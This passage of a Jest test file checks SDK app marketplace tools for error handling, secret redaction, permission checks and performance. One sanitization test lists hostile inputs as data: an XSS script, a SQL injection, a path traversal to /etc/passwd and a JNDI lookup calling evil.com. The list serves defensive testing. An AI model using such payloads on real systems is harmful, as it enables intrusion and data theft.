        mockApiClient.mockResponse('POST', '/*', {
          success: false,
          error: testErrors.networkError
        });
        mockApiClient.mockResponse('PUT', '/*', {
          success: false,
          error: testErrors.networkError
        });

        const tool = findTool(mockTool, toolName);
        await expect(executeTool(tool, input, { log: mockLog, reportProgress: mockReportProgress }))
          .rejects.toThrow(UserError);
      }
    });

    it('should handle network timeouts and retries', async () => {
      mockApiClient.mockNetworkError('GET', '/sdk-apps/marketplace', new Error('Network timeout'));

      const tool = findTool(mockTool, 'search-sdk-apps');
      await expect(executeTool(tool, {}, { log: mockLog }))
        .rejects.toThrow('Failed to search SDK apps');
    });

    it('should handle rate limiting errors', async () => {
      mockApiClient.mockResponse('POST', '/sdk-apps/install', {
        success: false,
        error: testErrors.rateLimitError
      });

      const tool = findTool(mockTool, 'install-sdk-app');
      await expect(executeTool(tool, {
        appId: 1,
        skipValidation: true,
        configuration: {}
      }, { log: mockLog, reportProgress: mockReportProgress }))
        .rejects.toThrow('Rate limit exceeded');
    });

    it('should handle authentication errors', async () => {
      mockApiClient.mockResponse('GET', '/sdk-apps/installed', {
        success: false,
        error: testErrors.authError
      });

      const tool = findTool(mockTool, 'list-installed-apps');
      await expect(executeTool(tool, {}, { log: mockLog }))
        .rejects.toThrow('Unauthorized access');
    });

    it('should log operations correctly for audit trail', async () => {
      mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
        success: true,
        data: [testSDKApp],
        metadata: { total: 1 }
      });

      const tool = findTool(mockTool, 'search-sdk-apps');
      await executeTool(tool, { query: 'productivity' }, { log: mockLog });

      expectToolCall(mockLog, 'info', 'Searching SDK apps');
      expectToolCall(mockLog, 'info', 'Successfully searched SDK apps');
    });

    it('should handle malformed API responses gracefully', async () => {
      mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
        success: true,
        data: null, // Malformed response
        metadata: null
      });

      const tool = findTool(mockTool, 'search-sdk-apps');
      const result = await executeTool(tool, {}, { log: mockLog });
      
      const parsed = JSON.parse(result);
      expect(parsed.apps).toEqual([]);
      expect(parsed.analysis.totalApps).toBe(0);
    });

    it('should validate input parameters with Zod schemas', async () => {
      const tools = [
        { name: 'install-sdk-app', invalidInput: { appId: -1, configuration: {} } },
        { name: 'update-sdk-app', invalidInput: { appId: 0 } },
        { name: 'configure-sdk-app', invalidInput: { appId: 'invalid', configuration: {} } },
        { name: 'install-workflow', invalidInput: { workflowId: -1, name: '' } }
      ];

      for (const { name: toolName, invalidInput } of tools) {
        const tool = findTool(mockTool, toolName);
        await expect(executeTool(tool, invalidInput, { log: mockLog }))
          .rejects.toThrow();
      }
    });
  });

  describe('Security and Data Protection', () => {
    beforeEach(async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
    });

    it('should never expose sensitive configuration data', async () => {
      const appWithSecrets = {
        ...testSDKApp,
        installation: {
          ...testSDKApp.installation,
          configuration: {
            apiKey: 'sk-very-secret-key',
            secretToken: 'super-secret-token',
            password: 'secret-password',
            dbConnectionString: 'mysql://user:pass@host/db'
          }
        }
      };

      mockApiClient.mockResponse('GET', '/sdk-apps/installed', {
        success: true,
        data: [appWithSecrets],
        metadata: { total: 1 }
      });

      const tool = findTool(mockTool, 'list-installed-apps');
      const result = await executeTool(tool, { includeConfiguration: false }, { log: mockLog });
      
      expect(result).not.toContain('sk-very-secret-key');
      expect(result).not.toContain('super-secret-token');
      expect(result).not.toContain('secret-password');
      expect(result).not.toContain('mysql://user:pass@host/db');
      expect(result).toContain('[CONFIG_HIDDEN]');
    });

    it('should sanitize marketplace search queries', async () => {
      mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
        success: true,
        data: [],
        metadata: { total: 0 }
      });

      const tool = findTool(mockTool, 'search-sdk-apps');
      
      // Test potential XSS/injection attacks
      const maliciousQueries = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE apps; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const query of maliciousQueries) {
        const result = await executeTool(tool, { query }, { log: mockLog });
        expect(result).toBeDefined();
        // Should not contain the malicious content
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('DROP TABLE');
      }
    });

    it('should validate app permissions and prevent privilege escalation', async () => {
      mockApiClient.mockResponse('PUT', '/sdk-apps/1/configure', {
        success: true,
        data: {
          configurationApplied: true,
          permissionsChanged: false, // Permission change rejected
          validation: {
            valid: false,
            errors: ['Insufficient privileges to grant admin_access'],
            warnings: []
          }
        }
      });

      const tool = findTool(mockTool, 'configure-sdk-app');
      const result = await executeTool(tool, {
        appId: 1,
        configuration: {},
        permissions: {
          grant: ['admin_access', 'system_access'], // Attempt privilege escalation
          revoke: []
        }
      }, { log: mockLog, reportProgress: mockReportProgress });
      
      const parsed = JSON.parse(result);
      expect(parsed.applied.permissions).toBe(false);
      expect(parsed.validation.errors).toContain('Insufficient privileges to grant admin_access');
    });

    it('should log security-relevant operations for audit trail', async () => {
      mockApiClient.mockResponse('GET', '/sdk-apps/1/installation', {
        success: true,
        data: { version: '2.0.0' }
      });
      mockApiClient.mockResponse('POST', '/sdk-apps/1/update', {
        success: true,
        data: { success: true, version: '2.1.0' }
      });

      const tool = findTool(mockTool, 'update-sdk-app');
      await executeTool(tool, { appId: 1, force: true }, { log: mockLog, reportProgress: mockReportProgress });

      expectToolCall(mockLog, 'info', 'Updating SDK app');
      expectToolCall(mockLog, 'info', 'Successfully updated SDK app');
    });
  });

  describe('Performance and Load Testing', () => {
    beforeEach(async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
    });

    it('should handle large marketplace searches efficiently', async () => {
      const largeAppList = Array.from({ length: 1000 }, (_, i) => ({
        ...testSDKApp,
        id: i + 1,
        name: `App ${i + 1}`
      }));

      mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
        success: true,
        data: largeAppList.slice(0, 100),
        metadata: { total: 1000 }
      });

      const tool = findTool(mockTool, 'search-sdk-apps');
      const startTime = Date.now();
      
      const result = await executeTool(tool, { limit: 100 }, { log: mockLog });
      
      const endTime = Date.now();
      const executionTime = endTime - startTime;
      
      expect(executionTime).toBeLessThan(5000); // Should complete within 5 seconds
      
      const parsed = JSON.parse(result);
      expect(parsed.pagination.total).toBe(1000);
      expect(parsed.apps).toHaveLength(100);
    });

    it('should handle concurrent installation requests', async () => {
      mockApiClient.mockResponse('GET', '/sdk-apps/*/compatibility', {
        success: true,
        data: { compatible: true, reasons: [] }
      });
      mockApiClient.mockResponse('POST', '*/sdk-apps/install', {
        success: true,
        data: { id: 'install-123', appId: 1 }
      });

      const tool = findTool(mockTool, 'install-sdk-app');
      
      // Simulate concurrent installations
      const promises = Array.from({ length: 5 }, (_, i) => 
        executeTool(tool, {
          appId: i + 1,
          configuration: {},
          skipValidation: true
        }, { log: mockLog, reportProgress: jest.fn() })
      );

      const results = await Promise.all(promises);
      results.forEach(result => {
        expect(result).toContain('installed successfully');
      });
    });

    it('should efficiently process complex workflow configurations', async () => {
      const complexWorkflow = {
        ...testWorkflowTemplate,
        template: {
          flow: Array.from({ length: 50 }, (_, i) => ({
            id: i + 1,
            app: 'test-app',
            operation: 'operation',
            metadata: { step: i + 1 }
          })),
          settings: { errorHandling: 'continue' }
        }
      };

      mockApiClient.mockResponse('GET', '/workflows/templates/1', {
        success: true,
        data: complexWorkflow
      });
      mockApiClient.mockResponse('POST', '/workflows/install', {
        success: true,
        data: { scenarioId: 'scenario-123' }
      });

      const tool = findTool(mockTool, 'install-workflow');
      const startTime = Date.now();
      
      const result = await executeTool(tool, {
        workflowId: 1,
        name: 'Complex Workflow',
        configuration: Object.fromEntries(
          Array.from({ length: 20 }, (_, i) => [`config${i}`, `value${i}`])
        )
      }, { log: mockLog, reportProgress: mockReportProgress });
      
      const endTime = Date.now();
      const executionTime = endTime - startTime;
      
      expect(executionTime).toBeLessThan(10000); // Should complete within 10 seconds
      expect(result).toContain('installed successfully');
    });

    it('should handle stress testing of marketplace filtering', async () => {
      // Simulate complex filtering operations
      const filterCombinations = [
        { category: 'productivity', verified: true, rating: 4.0 },
        { category: 'integration', publisher: 'Make.com' },
        { features: ['webhooks', 'api'], platform: 'web' },
        { query: 'automation', sortBy: 'rating', sortOrder: 'desc' }
      ];

      for (const filters of filterCombinations) {
        mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
          success: true,
          data: [testSDKApp],
          metadata: { total: 1 }
        });

        const tool = findTool(mockTool, 'search-sdk-apps');
        const result = await executeTool(tool, filters, { log: mockLog });
        
        expect(result).toContain('totalApps');
      }
    });
  });

  describe('External Service Integration Testing', () => {
    beforeEach(async () => {
      const { addSDKTools } = await import('../../../src/tools/sdk.js');
      addSDKTools(mockServer, mockApiClient as any);
    });

    it('should handle external marketplace service failures', async () => {
      mockApiClient.mockResponse('GET', '/sdk-apps/marketplace', {
        success: false,
        error: { message: 'External marketplace service unavailable', code: 'EXTERNAL_SERVICE_ERROR' }
      });

      const tool = findTool(mockTool, 'search-sdk-apps');
      await expect(executeTool(tool, {}, { log: mockLog }))
        .rejects.toThrow('External marketplace service unavailable');
    });

    it('should handle app dependency resolution failures', async () => {
      mockApiClient.mockResponse('GET', '/workflows/templates/1', {
        success: true,
        data: testWorkflowTemplate
      });
      mockApiClient.mockResponse('POST', '/workflows/install', {
        success: false,
        error: { message: 'Dependency resolution failed', code: 'DEPENDENCY_ERROR' }
      });

      const tool = findTool(mockTool, 'install-workflow');
      await expect(executeTool(tool, {
        workflowId: 1,
        name: 'Test Workflow',
        installDependencies: true
      }, { log: mockLog, reportProgress: mockReportProgress }))
        .rejects.toThrow('Dependency resolution failed');
    });

    it('should handle external app compatibility checks', async () => {
      // Simulate external service dependency
      mockApiClient.mockResponse('GET', '/sdk-apps/1/compatibility', {
        success: false,
        error: { message: 'Compatibility service timeout', code: 'SERVICE_TIMEOUT' }
      });

      const tool = findTool(mockTool, 'install-sdk-app');
      await expect(executeTool(tool, {
        appId: 1,
        configuration: {}
      }, { log: mockLog, reportProgress: mockReportProgress }))
        .rejects.toThrow('Compatibility check failed: Compatibility service timeout');
    });

    it('should handle app update rollback scenarios', async () => {
      mockApiClient.mockResponse('GET', '/sdk-apps/1/installation', {
        success: true,
        data: { version: '2.0.0' }
      });
      mockApiClient.mockResponse('POST', '/sdk-apps/1/update', {
        success: false,
        error: { message: 'Update failed, rollback initiated', code: 'UPDATE_ROLLBACK' }
      });

      const tool = findTool(mockTool, 'update-sdk-app');
      await expect(executeTool(tool, {
        appId: 1,
        rollbackOnFailure: true
      }, { log: mockLog, reportProgress: mockReportProgress }))
        .rejects.toThrow('Update failed, rollback initiated');
    });
  });
});